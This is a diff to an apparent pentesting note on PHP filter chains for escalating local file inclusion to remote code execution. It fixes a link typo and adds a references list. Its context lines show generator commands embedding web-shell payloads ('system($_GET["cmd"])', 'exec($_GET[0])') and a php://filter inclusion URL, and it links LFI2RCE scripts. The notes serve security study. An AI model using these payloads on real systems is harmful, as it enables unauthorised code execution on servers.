@@ -25,7 +25,7 @@ http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encod
 	- Generate PHP filter chains with [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
 	- Junk characters do end up appended to the end
 - [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
-- Consider [Hacktrick improves on a Alles CTF script to get LFI2RCE vai PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
+- Consider [Hacktricks improvements on a Alles CTF script to get LFI2RCE via PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
 
 ```bash
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
@@ -34,3 +34,16 @@ No `system` no problem
 ```bash
 python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 ```
+
+## References
+
+[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
+[PHP Documentation base64encode](https://www.php.net/manual/en/function.base64-encode.php)
+[Filter Chains Usage by Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
+[LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
+[Hacktricks improvements on a Alles CTF script to get LFI2RCE via PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
+[Validation Filters](https://www.php.net/manual/en/filter.filters.validate.php)
+[Sanitization Filters](https://www.php.net/manual/en/filter.filters.sanitize.php)
+[Misc Filters](https://www.php.net/manual/en/filter.filters.misc.php)
+[PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) 
+
